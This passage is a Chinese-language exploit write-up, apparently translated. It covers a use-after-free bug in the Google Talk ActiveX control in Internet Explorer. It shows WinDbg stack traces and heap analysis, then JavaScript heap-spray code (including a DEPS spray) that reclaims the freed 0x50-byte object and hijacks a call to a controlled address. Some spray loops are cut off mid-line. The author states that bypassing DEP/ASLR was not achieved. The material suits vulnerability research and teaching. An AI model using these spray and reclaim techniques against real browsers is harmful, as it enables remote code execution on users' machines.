       61de7b27 MSHTML!CHtmRootParseCtxRouter::EndElement+0x00000017  
       61dee7b2 MSHTML!CHtml5TreeConstructor::PopElement+0x000000b7  
       61f896b5 MSHTML!CTextInsertionMode::DefaultEndElementHandler+0x00000035  
       620fc85b MSHTML!CInsertionMode::HandleEndElementToken+0x0000003d  
       61df17f5 MSHTML!CHtml5TreeConstructor::HandleElementTokenInInsertionMode+0x00000026  
       61df16c8 MSHTML!CHtml5TreeConstructor::PushElementToken+0x000000a5  
       61f891f8 MSHTML!CHtml5Tokenizer::EmitElementToken+0x00000067  
       61f8a243 MSHTML!CHtml5Tokenizer::RCDATAEndTagName_StateHandler+0x000003bf  
       61deeec5 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000012c  
       61def19b MSHTML!CHtml5Parse::ParseToken+0x00000131  
       61dee707 MSHTML!CHtmPost::ProcessTokens+0x000006af  
       61de7f32 MSHTML!CHtmPost::Exec+0x000001e4  
       620b9a78 MSHTML!CHtmPost::Run+0x0000003d  
       620b99de MSHTML!PostManExecute+0x00000061  
       620c1e04 MSHTML!PostManResume+0x0000007b  
       61e4d397 MSHTML!CDwnChan::OnMethodCall+0x0000003e  
       61d0e101 MSHTML!GlobalWndOnMethodCall+0x0000016d  
       61d0db16 MSHTML!GlobalWndProc+0x000002e5  
       751262fa user32!InternalCallWinProc+0x00000023  
       75126d3a user32!UserCallWinProcCheckWow+0x00000109  
       751277c4 user32!DispatchMessageWorker+0x000003bc  
       7512788a user32!DispatchMessageW+0x0000000f  
       6366f668 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464  
       636a25b8 IEFRAME!LCIETab_ThreadProc+0x0000037b  
       7531d6fc iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c  
       5f893991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094
我们现在知道，ActiveX控件和Javascript使用相同的Heap，这是一个好消息。
**确定分配大小**
现在我们已经确认控件和JavaScript使用相同的堆，我们需要确定释放对象的分配大小。
为此，我们需要禁用所有gflags设置，除了usermode stack dbs。
我们还需要在它崩溃的地址下断点。
    bu googletalkax！DllUnregisterServer + 0x6385“！heap -p -a edi; g”
     70760ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:078f8a44=a48a8f07  
     0:005> !heap -p -a edi  
       address 078f8a28 found in  
       _HEAP @ 730000  
        HEAP_ENTRY Size Prev Flags  UserPtr UserSize - state  
         078f8a10 000d 0000 [00]  078f8a28  00050 - (busy)  
          ? googletalkax!DllUnregisterServer+43db0
从这里我们可以看到释放的对象的大小是0x50字节。
**堆喷射**
下一步是在与对象交互之前,使用堆喷射来覆盖已被释放的内存。为此，我们首先在Internet
Explorer中初始化低碎片堆。我们申请分配大量相同大小的块来进行堆喷射。
我们通过以下JavaScript函数来实现。这将创建一个0x50字节的子字符串,减去用于BSTR对象的4字节对象头，减去unicode字符串的2个终止NULL字节。因为该值存储为Unicode字符串，所以此值将除以2。最后,字符串将在内存中保持正确的0x50字节。
     var largechunk = unescape("sean3");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length  ）。
这将喷射堆，并在0x20302228内存地址保存我们的数据。
     function corelan_deps_spray()  
     {  
          var div_container = document.getElementById("corelanspraydiv");  
          div_container.style.cssText = "display:none";  
          junk = unescape("%u615d%u6161");  
          while (junk.length   
     var largechunk = unescape("%u2030%u2228");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length   
这个代码将做一个DEPS堆喷射，将内存0x20302228的值设置成0x61616161。
然后，“onmessage”中的代码将释放对象，并用相同大小（0x50字节）的对象来喷射堆。旧指针现在将指向我们分配的内存，其中包含指向0x20302228地址的指针。当访问失效指针时，将执行以下ASM代码。
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30      mov   esi,dword ptr [eax] 
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50       push  eax  
     13e70cb1 8d45e4     lea   eax,[ebp-1Ch]  
     13e70cb4 50       push  eax  
     13e70cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408     add   esp,8  
     13e70cc0 50       push  eax  
     13e70cc1 ff5604     call  dword ptr [esi+4]
Edi +
1c保存的旧指针，现在替换为我们的0x20302228指针，这被加载到eax,然后将0x20302228里的值放入ESI寄存器。值是0x6161615d，它是由DEPS喷射的。然后程序调用ESI
+ 4，这是一个用户提供的地址0x61616161，这证明可以执行代码。
**进一步利用**
下一步是将其变成一个可以完整利用的漏洞。因为DEP和ASLR，我们需要使用这个bug来创建infoleak。我花了一些时间来研究，参考
，但我没有找到进一步利用的方法。如果您有任何想法，请与我联系讨论他们。我会非常感兴趣，把这个bug变成infoleak。